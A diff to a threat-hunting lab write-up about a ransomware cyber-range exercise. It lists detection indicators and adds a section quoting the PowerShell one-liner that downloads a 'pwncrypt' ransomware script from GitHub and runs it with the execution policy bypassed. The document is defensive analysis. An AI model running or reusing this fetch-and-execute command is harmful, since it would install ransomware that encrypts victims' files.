@@ -151,4 +151,10 @@ Refine security strategy and improve future hunts.
   - File renames with **unusual extensions** (e.g., `.pwncrypt`).
   - PowerShell executions using `-ExecutionPolicy Bypass`.
  
+---
 
+### **Ransomware Command Snapshot**  
+⚠️ Example of how the ransomware script was executed:  
+```powershell
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
+```
